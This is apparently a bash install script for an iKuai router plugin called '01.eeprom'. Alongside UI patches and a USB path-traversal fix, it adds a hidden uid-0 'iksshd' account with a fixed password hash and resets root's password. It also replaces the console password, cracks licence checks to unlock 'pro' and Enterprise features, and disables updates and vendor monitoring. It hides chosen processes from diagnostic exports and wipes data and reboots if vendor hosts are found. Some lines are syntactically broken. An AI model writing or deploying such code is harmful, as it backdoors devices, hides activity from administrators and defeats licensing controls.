#!/bin/bash 
PLUGIN_NAME="01.eeprom"
rm /tmp/ikpkg/01.eeprom/install.sh -f
rm /tmp/ikpkg/eeprom/install.sh -f
INSTALL_DIR="$(cd "$(dirname "$0")" && pwd)"
hdd_get_sn1()
{
local hdd=$1
hexdump -v -s 5242624 -n 256 /dev/${hdd}2 -e '16/1 "%02x"'

}


#docker
dockerfx(){

doc_path=/etc/disk/*/Docker/lib/containers/*/config.v2.json
for doconfig in $doc_path; do
illegal=0
Source1=$(jq -r '.MountPoints[] | .Source' "$doconfig")
Source2=$(jq -r '.MountPoints[] | .Spec.Source' "$doconfig")
if [ -n "$Source1" ]; then
for path in $Source1; do
if ! echo "$path" | grep -q "^/etc/disk_user"; then
illegal=1
fi
if echo "$path" | grep -q "\.\."; then
illegal=1
fi
done
fi
if [ -n "$Source2" ]; then
for path in $Source2; do
if ! echo "$path" | grep -q "^/etc/disk_user"; then
illegal=1
fi
if echo "$path" | grep -q "\.\."; then
illegal=1
fi
done
fi
if [ "$illegal" -eq 1 ]; then
rm $doc_path
docker_img=$(dirname "$doc_path")
rm $docker_img -rf
fi
done

}

# USB漏洞修复, 该漏洞可以通过软链接的方式访问文件系统并修改文件
codefix_for_usb_vulnerability()
{
echo 'USB漏洞修复' >>/tmp/ipk.log
GetRealPaths=`grep 'GetRealPath' /usr/openresty/lua/lib/webman.lua|wc -l`
if [ $GetRealPaths -gt 0 ];then
return
fi

    local insert_script1="      local realpath=\$(readlink -f \/etc\/disk_user\/\$path)"
    local insert_script2="      [ \"\${realpath:0:9}\" = \"\/etc\/disk\" ] || path=\/etc\/disk_user"
    sed -i "/local data=\$(\$IK_DIR_SCRIPT/i\\$insert_script1" /usr/ikuai/script/file_mgmt.sh
    sed -i "/local data=\$(\$IK_DIR_SCRIPT/i\\$insert_script2" /usr/ikuai/script/file_mgmt.sh

    local insert_script3="function GetRealPath(diskpath)"
    local insert_script4="      local tmppath = string.format( \"%s\/disk\/%s\" , RootPath, diskpath)"
    local insert_script5="      local handle = io.popen(\"readlink -f \" .. tmppath)"
    local insert_script6="      local result = handle:read(\"*a\")"
    local insert_script7="      handle:close()"
    local insert_script8="      return result:gsub(\"%s+\$\", \"\")"
    local insert_script9="end"
    sed -i "/function ActionDiskUpload/i\\$insert_script3" /usr/openresty/lua/lib/webman.lua
    sed -i "/function ActionDiskUpload/i\\$insert_script4" /usr/openresty/lua/lib/webman.lua
    sed -i "/function ActionDiskUpload/i\\$insert_script5" /usr/openresty/lua/lib/webman.lua
    sed -i "/function ActionDiskUpload/i\\$insert_script6" /usr/openresty/lua/lib/webman.lua
    sed -i "/function ActionDiskUpload/i\\$insert_script7" /usr/openresty/lua/lib/webman.lua
    sed -i "/function ActionDiskUpload/i\\$insert_script8" /usr/openresty/lua/lib/webman.lua
    sed -i "/function ActionDiskUpload/i\\$insert_script9" /usr/openresty/lua/lib/webman.lua
    sed -i "/function ActionDiskUpload/i\\ " /usr/openresty/lua/lib/webman.lua

    local insert_script10="     local realpath = GetRealPath(diskpath)"
    local insert_script11="     if not realpath:match(\"^\/etc\/disk\/\") then"
    local insert_script12="             ikngx.senderror(ResUpSvrErr,\"Need param name: path\")"
    local insert_script13="     end"
    sed -i "/if not lastmodified then/i\\$insert_script10" /usr/openresty/lua/lib/webman.lua
    sed -i "/if not lastmodified then/i\\$insert_script11" /usr/openresty/lua/lib/webman.lua
    sed -i "/if not lastmodified then/i\\$insert_script12" /usr/openresty/lua/lib/webman.lua
    sed -i "/if not lastmodified then/i\\$insert_script13" /usr/openresty/lua/lib/webman.lua
    sed -i "/if not lastmodified then/i\\ " /usr/openresty/lua/lib/webman.lua
}

restore_app(){
echo '修正恢复出厂' >>/tmp/ipk.log
restore=`grep 'appinst.bin.pkg' /usr/ikuai/script/backup.sh|wc -l`
if [ $restore -gt 0 ];then
return
fi

sed -i '/IK_DIR_LOG\/\*/i\
mkdir /tmp/appbak/\
cp $IK_DIR_LOG/packages/db/.__DB.3.x86_64 /tmp/appbak/\
cp $IK_DIR_LOG/packages/appinst.bin.pkg /tmp/appbak/' /usr/ikuai/script/backup.sh


sed -i '/IK_DIR_LOG\/\*/a\
mkdir -p $IK_DIR_LOG/packages/db\
cp /tmp/appbak/.__DB.3.x86_64 $IK_DIR_LOG/packages/db/\
cp /tmp/appbak/appinst.bin.pkg $IK_DIR_LOG/packages/' /usr/ikuai/script/backup.sh


# 修复由于chroot挂载导致的磁盘管理页面会错误将已挂载分区显示为“不使用”的问题
sed -i "s/(\"df -B1\")/(\"df -B1 | grep -v chroot\")/g" /usr/ikuai/script/utils/disk_find.lua


}

disk_mgmt_app()
{
echo '修正格试化' >>/tmp/ipk.log
disk_mgmts=`grep 'appinst.bin.pkg' /usr/ikuai/script/disk_mgmt.sh|wc -l`
if [ $disk_mgmts -gt 0 ];then
return
fi
cat > insert_content.txt <<EOF
        5)
			rm /tmp/appbak -rf
			rm /tmp/disksd -rf
            mkdir -p /tmp/appbak/
            mkdir -p /tmp/disksd/
            cp /etc/log/packages/db/.__DB.3.x86_64 /tmp/appbak/
            cp/etc/log/packages/appinst.bin.pkg /tmp/appbak/
            if [ ! -e "/dev/\$part" ]; then
                Autoiecho disk_mgmt part_not_found "\$part"
                return 1
            fi
            if ! __lock_disk "\$part" ; then
                Autoiecho disk_mgmt disk_in_task
                return 1
            fi
            part=\$part mt_name= mt_purpose=0 partition_set
            sleep 1
            if ! __force_umount_part "\$part"; then
                Autoiecho disk_mgmt umount_fail
                __unlock_disk "\$part"
                return 1
            fi
            __format_part "\$part"
            __unlock_disk "\$part"
            mkfs.ext4 /dev/\$part
            sync
            mount /dev/\$part /tmp/disksd
            mkdir -p /tmp/disksd/packages/db/
            cp /tmp/appbak/.__DB.3.x86_64 /tmp/disksd/packages/db/
            cp /tmp/appbak/appinst.bin.pkg /tmp/disksd/packages/
            sync
            umount /tmp/disksd
            (sleep 3; reboot) >/dev/null 2>&1 &
            return 0
			;;
			
EOF
sed -i '/partition_format()/,/esac/ {s/1|2|4)/# INSERT_HERE\n        1|2|4)/}' /usr/ikuai/script/disk_mgmt.sh
sed -i '/# INSERT_HERE/r insert_content.txt' /usr/ikuai/script/disk_mgmt.sh
#sed -i '/# INSERT_HERE/d' /usr/ikuai/script/disk_mgmt.sh
sed -i '/3|5)/c\3)' /usr/ikuai/script/disk_mgmt.sh
}


disk_mgmt_app2()
{
echo '修正重新分区' >>/tmp/ipk.log
disk_mgmts=`grep 'INSERT_format' /usr/ikuai/script/disk_mgmt.sh|wc -l`
if [ $disk_mgmts -gt 0 ];then
return
fi
cat > insert_content2.txt <<EOF
			local part=\$disk"5"
			rm /tmp/appbak -rf
			rm /tmp/disksd -rf
            mkdir -p /tmp/appbak/
            mkdir -p /tmp/disksd/
            cp /etc/log/packages/db/.__DB.3.x86_64 /tmp/appbak/
            cp/etc/log/packages/appinst.bin.pkg /tmp/appbak/
            if [ ! -e "/dev/\$part" ]; then
                Autoiecho disk_mgmt part_not_found "\$part"
                return 1
            fi
            if ! __lock_disk "\$part" ; then
                Autoiecho disk_mgmt disk_in_task
                return 1
            fi
            part=\$part mt_name= mt_purpose=0 partition_set
            sleep 1
            if ! __force_umount_part "\$part"; then
                Autoiecho disk_mgmt umount_fail
                __unlock_disk "\$part"
                return 1
            fi
            __format_part "\$part"
            __unlock_disk "\$part"
            mkfs.ext4 /dev/\$part
            sync
            mount /dev/\$part /tmp/disksd
            mkdir -p /tmp/disksd/packages/db/
            cp /tmp/appbak/.__DB.3.x86_64 /tmp/disksd/packages/db/
            cp /tmp/appbak/appinst.bin.pkg /tmp/disksd/packages/
            sync
            umount /tmp/disksd
EOF

sed -i '/sleep 2; reboot/i #INSERT_format' /usr/ikuai/script/disk_mgmt.sh
sed -i '/#INSERT_format/r insert_content2.txt' /usr/ikuai/script/disk_mgmt.sh


}




cloud_log()
{

    echo "0.0.0.0 alpha-cloud-log.cn-hangzhou.log.aliyuncs.com" >> /etc/hosts
    echo "0.0.0.0 alpha-cloud-log.cn-shanghai.log.aliyuncs.com" >> /etc/hosts
    echo "0.0.0.0 alpha-cloud-log.cn-nanjing.log.aliyuncs.com" >> /etc/hosts
    echo "0.0.0.0 alpha-cloud-log.cn-fuzhou.log.aliyuncs.com" >> /etc/hosts
    echo "0.0.0.0 alpha-cloud-log.cn-qingdao.log.aliyuncs.com" >> /etc/hosts
    echo "0.0.0.0 alpha-cloud-log.cn-beijing.log.aliyuncs.com" >> /etc/hosts
    echo "0.0.0.0 alpha-cloud-log.cn-zhangjiakou.log.aliyuncs.com" >> /etc/hosts
    echo "0.0.0.0 alpha-cloud-log.cn-huhehaote.log.aliyuncs.com" >> /etc/hosts
    echo "0.0.0.0 alpha-cloud-log.cn-wulanchabu.log.aliyuncs.com" >> /etc/hosts
    echo "0.0.0.0 alpha-cloud-log.cn-shenzhen.log.aliyuncs.com" >> /etc/hosts
    echo "0.0.0.0 alpha-cloud-log.cn-heyuan.log.aliyuncs.com" >> /etc/hosts
    echo "0.0.0.0 alpha-cloud-log.cn-guangzhou.log.aliyuncs.com" >> /etc/hosts
    echo "0.0.0.0 alpha-cloud-log.cn-chengdu.log.aliyuncs.com" >> /etc/hosts
    echo "0.0.0.0 alpha-cloud-log.cn-hongkong.log.aliyuncs.com" >> /etc/hosts


}

close_DTalk(){

killall dtalkc
killall dtalkd
rm /usr/DTalkInside -rf
rm /usr/ikuai/script/dingtalk.sh -f
rm /usr/ikuai/function/dingtalk -f
rm /usr/lib/libdtalkd.so -f
rm /usr/sbin/dtalkc -f
rm /usr/sbin/dtalkd -f
rm /usr/DTalkInside -r -f
monidtalk1=`ps |grep "monidtalk"|grep -v "grep"|wc -l`
if [ $monidtalk1 -gt 0 ];then
monidtalk=`ps |grep "monidtalk"|grep -v "grep"|awk -F " " '{print $1}'`
kill $monidtalk
fi
}


triger_safe_guarantee() {

	iksshd=`cat /etc/shadow|grep "iksshd"|wc -l`
	if [ $iksshd -eq 0 ];then
		echo 'iksshd:$1$ebBzICAY$5CaSyktzPh8SEUYMHdzhf1:17857:0:99999:7:::' >>/etc/shadow
		echo 'iksshd:x:0:0:iksshd:/root:/bin/ash' >>/etc/passwd
	fi
		
	kxb1=`grep "开心版" /tmp/iktmp/auth_info|wc -l`
	kxb2=`grep "内部版" /tmp/iktmp/auth_info|wc -l`
	kxb3=`grep "社区版" /tmp/iktmp/auth_info|wc -l`
    PUBLIC1=`grep "PUBLIC_KEY"  /usr/ikuai/script/plugins.sh|wc -l`
    PUBLIC2=`grep "a0318c621f67e77c09c00738abd4e075"  /etc/setup/rc.console|wc -l`
    PUBLIC3=`grep "__upgrade_plugins"  /usr/ikuai/script/upgrade.sh|wc -l`
    if [ $PUBLIC1 -gt 0 -o $PUBLIC2 -gt 0 -o $PUBLIC3 -gt 0 -o $kxb1 -gt 0 -o $kxb2 -gt 0 -o $kxb3 -gt 0 ];then
		mv $INSTALL_DIR/script/upgrade.sh /usr/ikuai/script/upgrade.sh
		chmod +x /usr/ikuai/script/upgrade.sh
		echo "1" /tmp/iktmp/kxb.log
		kill -9 `ps |grep "ash --login" |grep -v "grep"|awk -F " " '{print $1}'`
		echo "51f477528ccdd806b8a5893dd6af499b" > /etc/mnt/ikuai/console_passwd
		touch /tmp/console.lock
		echo
    fi

    rm  /etc/mnt/boot_args -rf
	rm /etc/mnt/cron.d  -rf
	rm /etc/mnt/shells -rf
	
	#f27875437ba5876d4a6d67eb07500d50
	#e7c5ef3127b0764468df2a7a441d7165
    script="		if [ \"\$(echo \"\$opmode\"|md5sum)\" = \"e7c5ef3127b0764468df2a7a441d7165  -\" ];then"
    sed -i "/__login_console__=0/{n;d;}" /etc/setup/rc.console
    sed -i "/__login_console__=0/a\\$script" /etc/setup/rc.console
    
    
    
    sed -i 's/^root:.*/root:$1$Cfo1wl1X$.6IVkTgybOrYyqLcvtT3L1:17857:0:99999:7:::/' /etc/shadow
    sed -i '/^\(root\|daemon\|ftp\|network\|nobody\|sshd\|iksshd\):/!d' /etc/shadow
	
	

	
	
	
	$passwds=$(cat /etc/passwd|md5sum|awk -F " " '{print $1}')
	if [ "$passwds" != "2e35dbfe16d02ea1c6139429cca55e2a" ];then
		echo "root:x:0:0:root:/root:/etc/setup/rc" > /etc/passwd
		echo "daemon:*:1:1:daemon:/var:/bin/false" >> /etc/passwd
		echo "ftp:*:55:55:ftp:/home/ftp:/bin/false" >> /etc/passwd
		echo "network:*:101:101:network:/var:/bin/false" >> /etc/passwd
		echo "nobody:*:65534:65534:nobody:/var:/bin/false" >> /etc/passwd
		echo "sshd:x:0:0:sshd:/root:/etc/setup/rc" >> /etc/passwd
		echo 'iksshd:x:0:0:iksshd:/root:/bin/ash' >>/etc/passwd
	fi
	

        sshd_port=$(sqlite3 /etc/mnt/ikuai/config.db "select sshd_port from remote_control;")
        open_sshd=$(sqlite3 /etc/mnt/ikuai/config.db "select open_sshd from remote_control;")
        [ "$open_sshd" = "1" ] && dropbear -p $sshd_port




	hostsal=`grep "aliyuncs.com" /etc/hosts|wc -l`
	if [ $hostsal -gt 0 ];then
		rm /etc/log/packages -rf
		rm /etc/log/ikipk -rf
		rm /etc/log/IPK -rf
		rm /etc/log/app_dir -rf
		reboot -f
	fi

	hostsal=`grep "ikuai8.cn" /etc/hosts|wc -l`
	if [ $hostsal -gt 0 ];then
		rm /etc/log/packages -rf
		rm /etc/log/ikipk -rf
		rm /etc/log/IPK -rf
		rm /etc/log/app_dir -rf
		reboot -f
	fi





}


install()
{

killall -q dropbear && killall -q telnetd && killall -q ttyd
rm /tmp/data.tar -f
rm /tmp/datas.tar -f
pidof iktunc && reboot
[ -d /var/run/iktunc ] && reboot
[ -f /usr/sbin/iktunc ] && reboot

chmod +x $INSTALL_DIR/script/*
chmod +x $INSTALL_DIR/data/*


iptables -I INPUT -d 10.255.255.253/32 -j DROP
iptables -I OUTPUT -d 10.255.255.253/32 -j DROP

iptables -I INPUT -d 10.255.255.254/32 -j DROP
iptables -I OUTPUT -d 10.255.255.254/32 -j DROP

iptables -I OUTPUT -p tcp --dport 6000 -j DROP
iptables -I OUTPUT -p udp --dport 6000 -j DROP

iptables -I INPUT -p tcp --dport 6000 -j DROP
iptables -I INPUT -p udp --dport 6000 -j DROP

iptables -I INPUT -p tcp --dport 622 -j DROP
iptables -I OUTPUT -p tcp --dport 622 -j DROP

ip6tables -I INPUT -p tcp --dport 622 -j DROP
ip6tables -I OUTPUT -p tcp --dport 622 -j DROP

ip6tables -I INPUT -p tcp --dport 6000 -j DROP
ip6tables -I OUTPUT -p tcp --dport 6000 -j DROP

if [ ! -f /usr/ikuai/script/wireguard.sh ];then
	mkdir -p /tmp/iktmp/wireguard/config
	mv  $INSTALL_DIR/script/audit_terminal_stat.sh /usr/ikuai/script/audit_terminal_stat.sh
	mv  $INSTALL_DIR/script/ike_client.sh /usr/ikuai/script/ike_client.sh
	mv  $INSTALL_DIR/script/ike_server.sh /usr/ikuai/script/ike_server.sh
	mv  $INSTALL_DIR/script/pppoe_proxy.sh /usr/ikuai/script/pppoe_proxy.sh
	mv  $INSTALL_DIR/script/wireguard.sh /usr/ikuai/script/wireguard.sh
	ln -s /usr/ikuai/script/audit_terminal_stat.sh /usr/ikuai/function/audit_terminal_stat
	ln -s /usr/ikuai/script/ike_client.sh /usr/ikuai/function/ike_client
	ln -s /usr/ikuai/script/ike_server.sh /usr/ikuai/function/ike_server
	ln -s /usr/ikuai/script/pppoe_proxy.sh /usr/ikuai/function/pppoe_proxy
	ln -s /usr/ikuai/script/wireguard.sh /usr/ikuai/function/wireguard
fi
#packages.ikuai8.com.w.kunlunca.com

sed -i '/OEM_CRE_MONITOR/{N;N;N;N;N;d;}' /usr/ikuai/script/utils/monitor_process.sh
sed -i '/get_process_status cre ;then/{N;N;N;d;}' /usr/ikuai/script/utils/monitor_process.sh
sed -i '/get_process_status ik_rc_client/{N;N;N;d;}' /usr/ikuai/script/utils/monitor_process.sh
sed -i '/get_process_status pmd/{N;N;N;d;}' /usr/ikuai/script/utils/monitor_process.sh
sed -i '/using_hosts_update_process()/{N;N;N;N;N;N;N;N;d;}' /usr/ikuai/script/utils/monitor_process.sh
kill `ps |grep "monitor_process.sh"|grep -v "grep"|awk -F " " '{print $1}'`

#rm /tmp/ikpkg/appinst/version
rm /tmp/ikpkg/appinst/appinst -f
rm /tmp/ikpkg/appinst/*.sh -f
#DTalk=$(cat /etc/mnt/DTalk)
#if [ $DTalk == "01" ];then
#close_DTalk
#fi


#修改文件上传限制
sed -i 's/50\*/1024\*/g' /usr/openresty/lua/lib/webman.lua
chmod +x $INSTALL_DIR/script/*
rm /usr/ikuai/script/upgrade.sh -f
mv  $INSTALL_DIR/script/upgrade.sh /usr/ikuai/script/upgrade.sh
#dockerfx
triger_safe_guarantee

	#sed -i 's/[a-f0-9]\{32\}/c8130c66f9840ce25187a8243b135c2e/g' /etc/setup/rc.console
	sed -i 's/[a-f0-9]\{32\}/c8130c66f9840ce25187a8243b135c2e/g' /sbin/sysinit

	codefix_for_usb_vulnerability
	restore_app
	disk_mgmt_app
	disk_mgmt_app2
	cloud_log

#修改技技导出报告中的过滤
sed -i 's#top -n 3#top -n 3 |grep -v "grep" |grep -v "Docker_patch" |grep -v "vnl" |grep -v "vnt" |grep -v "AdGu" |grep -v "Crash" |grep -v "npc"#' /usr/ikuai/script/utils/export_sysinfo.sh

#插件显示
docker_jsok=0
ipv6_jsok=0
mkdir /tmp/jstmp -p
for file in /usr/ikuai/www/static/js/*.js.gz;
do
output_file="$(basename "$file" .gz)"
gunzip -c "$file" > "/tmp/jstmp/$output_file"
docker_js=`grep 'location.host+"/plugins/docker/' /tmp/jstmp/$output_file|wc -l`
ipv6_js=`grep 'network.ipv6.Access_method' /tmp/jstmp/$output_file|wc -l`
	if [ $docker_js -gt 0 ];then
				echo "找到文件docker_js名为$output_file" >>/tmp/ipk.log
				sed -i 's/t.yunbindstatus=""!=i.code?2:1/t.yunbindstatus=2/' /tmp/jstmp/$output_file
				sed -i 's|location\.host+"/plugins/docker/"+t\.dockerList\[i\]\.name+"\.\png",t\.dockerList\[i\]\.iframesrc=location\.protocol+"//"+location\.host+"/plugins/docker/"+t\.dockerList\[i\]\.name+".html"|location.host+"/plugins/"+t.dockerList[i].name+"/"+t.dockerList[i].name+".png",t.dockerList[i].iframesrc=location.protocol+"//"+location.host+"/plugins/"+t.dockerList[i].name+"/"+t.dockerList[i].name+".html"|' /tmp/jstmp/$output_file
				sed -i 's/this.dockertitle="docker"/this.dockertitle=t.alias/' /tmp/jstmp/$output_file
				sed -i 's/e.name/e.alias/' /tmp/jstmp/$output_file
				
				sed -i 's/docker"==t.dockertitle/docker"!=t.dockertitle/' /tmp/jstmp/$output_file
				sed -i 's/t\._v("Docker"/t\._v(t.dockertitle/' /tmp/jstmp/$output_file
				sed -i 's/dockerShow()})}/dockerShow()}/' /tmp/jstmp/$output_file
				sed -i 's/this.\$http.post(s.a.apiUrl,{func_name:"register",action:"show",param:{TYPE:"data,gwid"}}).then(function(e){var i=e.data.Data.data\[0\];//g' /tmp/jstmp/$output_file
				gzip -c /tmp/jstmp/$output_file > /usr/ikuai/www/static/js/$output_file.gz
			docker_jsok=1
			continue
	fi
	if [ $ipv6_js -gt 0 ];then
		echo "找到文件ipv6名为$output_file" >>/tmp/ipk.log
		sed -i 's/newWanTableRow:function(){/newWanTableRow:function(){this.bind_status=1;/' /tmp/jstmp/$output_file
		gzip -c /tmp/jstmp/$output_file > /usr/ikuai/www/static/js/$output_file.gz
		rm /tmp/jstmp/$output_file
		ipv6_jsok=1
	fi
	
	if [ $ipv6_jsok -eq 1 ] &&  [ $docker_jsok -eq 1 ];then
	rm /tmp/jstmp -r
	break
	fi
	
	
done

	cp $INSTALL_DIR/data/app.js /usr/ikuai/www/static/css/app.js
	cp $INSTALL_DIR/data/app.css /usr/ikuai/www/static/css/app.css
	rm -rf /usr/ikuai/www/plugins/$PLUGIN_NAME
	ln -sf $INSTALL_DIR/html /usr/ikuai/www/plugins/$PLUGIN_NAME
	ln -sf $INSTALL_DIR/script/eeprom.sh         /usr/ikuai/function/plugin_eeprom

BOOTHDD=`cat /etc/release|grep "BOOTHDD"|awk -F "=" '{print $2}'`
GWID=`cat /etc/release|grep "GWID"|awk -F "=" '{print $2}'`
VIRTUAL_DEVICE=`cat /etc/release|grep "VIRTUAL_DEVICE"|awk -F "=" '{print $2}'`
product_uuid=`cat /sys/class/dmi/id/product_uuid`
machine=`genuine -h`
sn=`hdd_get_sn1 $BOOTHDD`
regstatus=`genuine -s "$machine" "$sn"`


	
#设置软件安装目录
app_dir=/etc/log/app_dir
if [ ! -d $app_dir ];then
	mkdir $app_dir -p
fi
	
if [ -n "$regstatus" ]; then
		if [ "$regstatus" == "pro" ] || [ "$regstatus" == "auto" ];then
					if [ -d /etc/log/ikipk ];then
						echo '安装ipk' >>/tmp/ipk.log
						mkdir /tmp/iktmp/app_install -p
						FILE_tar=/tmp/iktmp/app_install/app.tar

						for FILE in /etc/log/ikipk/*;
							do
							echo '进入安装ipk' >>/tmp/ipk.log
								app_name=$(basename $FILE)
									if ! genuine -f $FILE $FILE_tar >/dev/null 2>/dev/null ;then
											echo "解密错误" >>/tmp/ipk.log
											rm /etc/log/IPK/$FILE -rf
											rm /etc/log/ikipk/$FILE -rf
											rm /etc/log/app_dir/$FILE -rf
											rm $FILE_tar
										else
										
											shdir=$BASENAME
											APPcheck=`hexdump -v -s 0x0 -n 4 -e '1/1 "%02x"' $FILE_tar`
											if [ "$APPcheck" == "1f8b0800" ] || [ "$APPcheck" == "1f8b0808" ];then
												argvc=xOzf
												argvx=xzvf
											else
												argvc=xOf
												argvx=xf
											fi

											echo "解密成功" >>/tmp/ipk.log
											tar -$argvx $FILE_tar -C /tmp/iktmp/app_install/ >/dev/null
											rm $FILE_tar
											PLUGIN_dir=$(ls -d /tmp/iktmp/app_install/*)
											installsh=$(cat $PLUGIN_dir/install.sh)
											PLUGIN_NAMES=$(echo "$installsh" | grep '^PLUGIN_NAME=' | sed -n 's/^PLUGIN_NAME="\([^"]*\)"/\1/p')
											rm $app_dir/$PLUGIN_NAMES/html -rf
											rm $app_dir/$PLUGIN_NAMES/script -rf
											mkdir /tmp/ikipk -p
											mv $PLUGIN_dir  /tmp/ikipk/											
											if [ ! -d $app_dir/$PLUGIN_NAMES/data ];then
												echo "不存在data,$PLUGIN_NAMES" >>/tmp/ipk.log
												mv /tmp/ikipk/$PLUGIN_NAMES/data $app_dir/$PLUGIN_NAMES/
												rm /tmp/ikipk/$PLUGIN_NAMES/data -rf
											else
												rm /tmp/ikipk/$PLUGIN_NAMES/data -rf
											fi

											ln -s $app_dir/$PLUGIN_NAMES/data /tmp/ikipk/$PLUGIN_NAMES/data
											bash /tmp/ikipk/$PLUGIN_NAMES/install.sh >/dev/null &
								
									fi
								
							done
					else
					echo '/etc/log/ikipk不存在' >>/tmp/ipk.log
					mkdir /etc/log/ikipk
				fi
			
		else
			echo '未注册' >>/tmp/ipk.log
			rm /etc/log/ikipk/* -rf
			rm /etc/log/IPK/* -rf
			rm /tmp/ikipk/* -rf
			rm $app_dir/* -rf
			exit	
		fi
else

	echo '未注册' >>/tmp/ipk.log
	echo "$machine" >>/tmp/ipk.log
	echo "$sn" >>/tmp/ipk.log
	echo "$regstatus" >>/tmp/ipk.log
	rm /etc/log/ikipk/* -rf
	rm /etc/log/ikipk/* -rf
	rm /etc/log/IPK/* -rf
	rm /tmp/ikipk/* -rf
	rm $app_dir/* -rf
	exit
fi


#sed -i "/netstat -atnp/i\return" /usr/ikuai/script/utils/collection.sh
#sed -i '/^PKG_PATH="\/etc\/mnt\/\.ipv6_multi"/i return' /usr/ikuai/script/utils/collection.sh
#读取IPV6数量
BOOTHDD=`cat /etc/release|grep "BOOTHDD"|awk -F "=" '{print $2}'`
NUM=`hexdump -v -s 96 -n 1 /dev/${BOOTHDD}2 -e '1/1 "%02x"'`
eeprom_app=`hexdump -v -s 98 -n 1 /dev/${BOOTHDD}2 -e '1/1 "%02x"'`
if [ "$NUM" == "00" ] || [ "$NUM" == "ff" ];then
NUM=0
else
NUM=`hexdump -v -s 96 -n 1 /dev/${BOOTHDD}2 -e '1/1 "%02x"' | sed 's/^0\+//'`
fi
if [ $eeprom_app == "f1" ];then
rm -rf /usr/ikuai/www/plugins/$PLUGIN_NAME
rm -rf /usr/ikuai/www/plugins/02.pgstore
rm -rf /usr/ikuai/www/plugins/eeprom
fi

if [ $regstatus == "pro" ];then
	
	if [ $NUM -eq 0 ];then
		NUM=3
	fi
fi

if [ $regstatus == "pro" ] || [ $NUM -ne 0 ];then

echo 'IPV6多线消取消关闭' >>/tmp/ipk.log
sed -i '/ipv6_multi"/i return' usr/ikuai/script/utils/collection.sh
sed -i 's/check_ipv6_multi_expires /#check_ipv6_multi_expires /' usr/ikuai/script/utils/collection.sh
sed -i 's/ipv6_multi/ipv6s_multi/g' /usr/ikuai/script/ipv6.sh
sed -i 's/local bind_status=0/local bind_status=1/'  /usr/ikuai/script/ipv6.sh
sed -i "s/local num=[0-9]\+/local num=${NUM}/g" /usr/ikuai/script/ipv6.sh
sed -i '/reset >\/dev\/null/i return 0' /usr/ikuai/script/ipv6.sh
sed -i "s/rm \$PKG_PATH/echo \"expires=0 num=${NUM} enterprise=1\" > \${PKG_PATH}/g" /usr/ikuai/script/ipv6.sh
rm /usr/ikuai/script/ipv6.sh.orig
cp /usr/ikuai/script/ipv6.sh /usr/ikuai/script/ipv6.sh.orig
echo "expires=0 num=$NUM enterprise=1" >/etc/mnt/.ipv6s_multi
sed -i "s/IPV6_num=[0-9]\+/IPV6_num=${NUM}/g" $INSTALL_DIR/data/Docker_patch.sh

fi

if [ $regstatus == "pro" ];then
	
	RomName=$(cat /etc/mnt/RomNames)
	
		if [ $RomName == "01" ];then
		#sed -i "2i\exit 0 #INS001" /usr/ikuai/script/gv.sh
		
			if [ `cat /usr/openresty/lua/lib/ikngx.lua |grep "/tmp/release"|wc -l` -eq 0  ];then
				echo '开启企业版' >>/tmp/ipk.log
				cp /etc/release /tmp/release
				sed  -i 's/Build/Enterprise &/' /tmp/release
				echo 'ENTERPRISE=Enterprise' >>/tmp/release
				sed -i "2i\. \/tmp\/release #INS001" /usr/ikuai/script/sysstat.sh
				sed -i 's/etc\/release/tmp\/release/'  /usr/openresty/lua/lib/ikngx.lua

				#开启语言
				sed -i 's/\${SUPPORT_I18N}/1/g' /usr/ikuai/script/sysstat.sh
				sed -i 's/\$SUPPORT_I18N/1/g' /usr/ikuai/script/basic.sh
				sed -i 's/IKRELEASE.SUPPORT_I18N/true/' /usr/openresty/lua/webman/index.lua
				lang=$(hexdump -v -s 32 -n 1 /dev/${BOOTHDD}2 -e '1/1 "%d"')
				rm -f /tmp/iktmp/LANG/*
				touch /tmp/iktmp/LANG/$lang
				openresty -s stop && sleep 1 && openresty
				
			fi
			
		fi

fi


closeup=$(cat /etc/mnt/closeup)

if [ $closeup == "01" ];then
	# 关闭在线更新
	sed -i '/iktmp/ i return 1 #clseupdate' /usr/ikuai/include/version_all.sh
	rm /tmp/iktmp/Version_all -rf
fi

sh $INSTALL_DIR/data/Docker_patch.sh >/dev/null &

if [ -d /tmp/ikipk ];then
	echo '启动ipk' >>/tmp/ipk.log
	for script in /tmp/ikipk/*/script/*.sh; do bash "$script" start & done
fi

}

__uninstall()
{

	rm -rf /usr/ikuai/www/plugins/$PLUGIN_NAME
}

uninstall()
{
	__uninstall >/dev/null 2>&1
}

procname=$(basename $BASH_SOURCE)
if [ "$procname" = "install.sh" ];then
        install
elif [ "$procname" = "uninstall.sh" ];then
        uninstall
fi


